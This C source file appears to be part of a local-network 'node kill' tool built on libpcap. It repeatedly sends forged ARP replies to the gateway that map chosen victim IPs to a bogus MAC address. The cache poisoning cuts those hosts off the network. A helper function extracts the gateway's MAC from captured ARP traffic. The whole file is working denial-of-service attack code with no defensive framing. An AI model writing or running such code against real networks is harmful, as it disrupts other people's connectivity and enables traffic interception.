#include "node_kill.h"

void *send_kill_packet(void *arg)
{
	int dest_ip;
	const unsigned char *packet = NULL;		//packet
	sendkill_grub_args *k_args = (sendkill_grub_args*)arg;

	while(1) {
		for(dest_ip=1; dest_ip<255; dest_ip++) {
			if(k_args->n_args->k_list.target_ip[dest_ip] == 1) {
				printf("send kill = %d\n", dest_ip);

				packet = make_kill_packet(*(k_args->gate_info), k_args->n_args->g_ip, dest_ip);
				pcap_sendpacket(k_args->descr, packet, 42);
			}
		}
		sleep(2);
	}
}

unsigned char* make_kill_packet(device_info gate_info, u_char gate_last_addr, u_char dest_last_addr)
{
	static unsigned char pack_data[42];
	etherhdr_t et_hdr;
	arphdr_t arp_hdr;
	unsigned char chage_macaddr[6];
	memcpy(chage_macaddr, &gate_info, 6);
	chage_macaddr[5] = 0x11;
	int i;


	memset(&arp_hdr, 0x00, sizeof(arphdr_t));       //init

	/*ethernet*/
	// memset(&et_hdr, 0xff, 6);            //et_hdr.h_dest[]
	for(i=0; i<6; i++) {
		et_hdr.h_dest[i] = gate_info.macaddr[i];
		arp_hdr.tha[i] = gate_info.macaddr[i];
	}

	memcpy((unsigned char*)&et_hdr+6, chage_macaddr, 6);    //et_hdr.h_source[]

	et_hdr.h_proto = htons(0x0806);

	/*arp*/
	arp_hdr.htype = htons(0x0001);
	arp_hdr.ptype = htons(0x0800);
	arp_hdr.oper = htons(ARP_REPLY);
	arp_hdr.hlen = 0x06;
	arp_hdr.plen = 0x04;

	memcpy((unsigned char*)&arp_hdr+8, chage_macaddr, 6);       //arp_hdr.sha[]

	memcpy((unsigned char*)&arp_hdr+14, (unsigned char*)&gate_info+6, 3);   //arp_hdr.spa[]
	arp_hdr.spa[3] = dest_last_addr;

	memcpy((unsigned char*)&arp_hdr+24, (unsigned char*)&gate_info+6, 3);   //arp_hdr.tpa[3] 까지
	arp_hdr.tpa[3] = gate_last_addr;
	memset(pack_data, 0, sizeof(pack_data));
	memcpy(pack_data, &et_hdr, 14);
	memcpy(pack_data+14, &arp_hdr, 28);

	return pack_data;
}

int gateway_get(const unsigned char *packet, u_char gate_ip, device_info *dev_gate)
{
	etherhdr_t *ether = (etherhdr_t*)(packet);
	arphdr_t *arpheader = (struct arphdr *)(packet+14); /* Point to the ARP header */
	int i=0;

	if(ntohs(ether->h_proto) != 0x0806)
		return 0;

	if(ntohs(arpheader->oper) == ARP_REQUEST)
		return 0;

	if(arpheader->spa[3] != gate_ip)
		return 0;

	/* If is Ethernet and IPv4, print packet contents */
	if (ntohs(arpheader->htype) == 1 && ntohs(arpheader->ptype) == 0x0800){

		// printf("GateWay MAC: ");

		for(i=0; i<6;i++) {
			dev_gate->macaddr[i] = arpheader->sha[i];
			// printf("%02X:", arpheader->sha[i]);
		}
		// printf("\nGateWay IP: ");

		for(i=0; i<4;i++) {
			dev_gate->ipaddr[i] = arpheader->spa[i];
			// printf("%d.", arpheader->spa[i]);
		}

	}
	return 1;
}
